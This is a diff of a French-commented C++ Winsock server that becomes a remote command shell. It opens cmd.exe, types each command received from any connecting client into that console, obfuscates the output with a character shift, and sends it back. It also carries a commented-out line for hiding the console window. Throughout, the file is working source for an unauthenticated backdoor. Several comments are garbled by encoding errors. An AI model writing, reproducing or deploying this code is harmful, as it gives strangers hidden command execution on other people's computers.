@@ -1,10 +1,10 @@
-#ifndef WIN32_LEAN_AND_MEAN
+ï»¿#ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
-// Importations initiales
+// Importations
 
 #include <windows.h>
 #include <winsock2.h>
@@ -17,32 +17,32 @@
 #include <sstream>
 #include <filesystem>
 #include <fstream>
+#include <shellapi.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 
-// Namespaces
-
+// Namespace
 using namespace std;
-namespace fs = filesystem;
 
-// Méthode de vérification des bytesRecv
-bool bytesVerification(int bytesReceveid) {
+// String prÃ©-enregistrÃ©s
 
-	if (bytesReceveid <= 0) {
-		cout << "Une erreur de réception s'est produite" << endl;
-		// TODO : Socket close et retirer du master fd_set
-		return false;
-	}
-	return true;
-}
+const string servMsg = "<SERVER> ";
+const string clientMsg = "<CLIENT> ";
+const string errorMsg = "<ERROR> ";
+
+// MÃ©thodes supplÃ©mentaires
+
+bool bytesVerification(int bytesReceveid, SOCKET sock, fd_set& master);
+void sendFileToClient(string path, SOCKET sock, fd_set& master);
+void encryption(string path);
 
 // Main
+
 int main() {
 
-	// String pré-enregistrés
-
-	const string servMsg = "<SERVER> ";
-	const string errorMsg = "<ERROR> ";
+	// Cacher la fÃªnÃªtre d'execution
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_RESTORE);
 
 	// Initialisation de WinShock
 
@@ -76,7 +76,7 @@ int main() {
 
 	bind(listeningSocket, (SOCKADDR*)&saServer, sizeof(saServer));
 
-	// Mettre WinSock en mode écoute (Un thread, mais peut supporter plusieurs clients)
+	// Mettre WinSock en mode ï¿½coute (Un thread, mais peut supporter plusieurs clients)
 
 	listen(listeningSocket, SOMAXCONN);
 
@@ -97,22 +97,34 @@ int main() {
 
 			if (sock == listeningSocket) {
 
-				// Création du socket client
+				// Crï¿½ation du socket client
 
 				sockaddr_in client;
 				SOCKET clientSocket;
 				int clientSize = sizeof(client);
 
-				// Donne accès au client à se connecter
+				// Donne accï¿½s au client ï¿½ se connecter
 				clientSocket = accept(listeningSocket, (sockaddr*)&client, &clientSize);
 
-				// Ajoute la nouvelle connexion dans la liste des clients connectés
+				// Ajoute la nouvelle connexion dans la liste des clients connectï¿½s
 				FD_SET(clientSocket, &master);
 
 				// Envoie un message de confirmation au client
-				
+
 				string welcome = "La connexion a ete etablie!";
 				send(clientSocket, welcome.c_str(), (int)welcome.size() + 1, 0);
+
+				// Ouverture de la console CMD
+
+				HINSTANCE instanceCMD;
+
+				instanceCMD = ShellExecute(NULL, L"open", L"cmd.exe", NULL, NULL, SW_SHOWNORMAL);
+
+				if (instanceCMD <= (HINSTANCE)32) {
+					cout << errorMsg << "Le lancement du CMD a echoue. Erreur #" << GetLastError() << endl;
+					closesocket(sock);
+					FD_CLR(sock, &master);
+				}
 
 				// Affichage de la connexion du client dans la console du serveur
 
@@ -130,76 +142,173 @@ int main() {
 				}
 			}
 
-			// Nous souhaitons communiquer avec un socketClient déjà existant
+			// Nous souhaitons communiquer avec un socketClient dÃ©jÃ  existant
 
 			else {
 
 				// Variables
 
+				HWND windowCMD;
+
 				char buf[4096];
 				int bytesReceived = 0;
-				string msgReceived = "";
-				vector<string> splittedMsg(0);
 
 				string commande = "";
-				int count = 0;
-				const string path = "../Data/";
 
-				int pathIndex = 0;
-				string filePath = "";
+				ifstream file;
+
+				const string path = "output.txt";
+				const string errorPath = "error.txt";
 				long fileSize = 0;
-				vector<string> fileNameVec(0);
-				string fileName;
 
-				// On recoit les commandes
+				// RÃ©ception de la commande du client
 
 				ZeroMemory(buf, 4096);
 				bytesReceived = recv(sock, buf, 4096, 0);
 
-				if (bytesVerification(bytesReceived)) {
+				if (bytesVerification(bytesReceived, sock, master)) {
 
-					cout << string(buf, 0, bytesReceived) << endl;
+					// Transformation de la commande et affichage
 
+					commande = string(buf, 0, bytesReceived) + " > " + path + " 2> " + errorPath;
+					cout << clientMsg << "La commande est " << commande << endl;
+
+
+					// On execute la commande du client dans le CMD
+
+					windowCMD = FindWindow(L"ConsoleWindowClass", L"C:\\WINDOWS\\system32\\cmd.exe");
+
+					for (auto c : commande) {
+						SendMessage(windowCMD, WM_CHAR, c, NULL);
+					}
+					SendMessage(windowCMD, WM_CHAR, '\r', NULL);
 				}
 
-				// Lecture et envoie du ouput de la console
+				Sleep(1000);
 
-				ifstream file(path, ios::binary);
+				// Observation de la taille de "output.txt" afin d'observer une erreur potentielle
+
+				file.open(path, ios::binary);
 
 				if (file.is_open()) {
-					
-					cout << "Document ouvert" << endl;
 
-					// Envoyer la taille (octets) du fichier
+					Sleep(1000);
 
 					file.seekg(0, ios::end);
 					fileSize = file.tellg();
-					send(sock, (char*)&fileSize, sizeof(long), 0);
-
-					// Envoyer le fichier partie par partie
-
-					file.seekg(0, ios::beg);
-
-					do {
-						
-						// Lecture du fichier et envoie
-
-						ZeroMemory(buf, 4096);
-						file.read(buf, 4096);
-
-						if (file.gcount() > 0)
-							send(sock, buf, file.gcount(), 0);
-
-					} while (file.gcount() > 0);
 
 					file.close();
+					ZeroMemory(buf, 4096);
+
+					if (fileSize > 0) // La commande est valide
+						sendFileToClient(path, sock, master);
+					else
+						sendFileToClient(errorPath, sock, master);
 				}
-				else
-					cout << "Erreur lors de l'ouverture" << endl; // TODO : modifier
 			}
 		}
 	}
 
-	// Ménage de WinSock
+	// Mï¿½nage de WinSock
 	WSACleanup();
+}
+
+
+bool bytesVerification(int bytesReceveid, SOCKET sock, fd_set& master) {
+
+	if (bytesReceveid <= 0) {
+		cout << "Une erreur de reception s'est produite" << endl;
+		closesocket(sock);
+		FD_CLR(sock, &master);
+		return 0;
+	}
+	return true;
+}
+
+void sendFileToClient(string path, SOCKET sock, fd_set& master) {
+
+	encryption(path);
+
+	// Variables
+
+	char buf[4096];
+	int bytesReceived = 0;
+
+	ifstream file(path, ios::binary);
+	long fileSize;
+
+	// Envoie de la taille du fichier
+
+	file.seekg(0, ios::end);
+	fileSize = file.tellg();
+
+	send(sock, (char*)&fileSize, sizeof(long), 0);
+
+	// RÃ©ception d'un message de confirmation
+
+	ZeroMemory(buf, 4096);
+	bytesReceived = recv(sock, buf, 4096, 0);
+
+	if (bytesVerification(bytesReceived, sock, master)) {
+
+		cout << clientMsg << "Confirmation obtenue!" << endl;
+
+		ZeroMemory(buf, 4096);
+
+		// Envoie du fichier morceaux par morceaux
+
+		file.seekg(0, ios::beg);
+
+		do {
+			// Lecture du fichier et envoie
+
+			file.read(buf, 4096);
+			if (file.gcount() > 0)
+				send(sock, buf, file.gcount(), 0);
+
+		} while (file.gcount() > 0);
+
+		cout << servMsg << "Envoie complete!" << endl;
+
+		file.clear();
+		file.close();
+	}
+}
+
+void encryption(string path) {
+
+	char buf[4096];
+	ZeroMemory(buf, 4096);
+
+	string line = "";
+
+	string t = "";
+
+	string file = "";
+
+	fstream fileToEncrypt(path, ios::in | ios::out);
+
+	ofstream of(path, ios::in | ios::out);
+
+	if (fileToEncrypt.is_open()) {
+
+		//lecture de chaque ligne de output.txt et fait l'encryption
+
+		while (getline(fileToEncrypt, line)) {
+			for (char c : line) {
+				c += 2;
+				string tt = string(1, c);
+				t.append(tt);
+			}
+			t.append("\n");
+			file += t;
+			t.clear();
+		}
+
+		fileToEncrypt.clear();
+		fileToEncrypt.close();
+
+		of.write(file.c_str(), file.size());
+		of.close();
+	}
 }
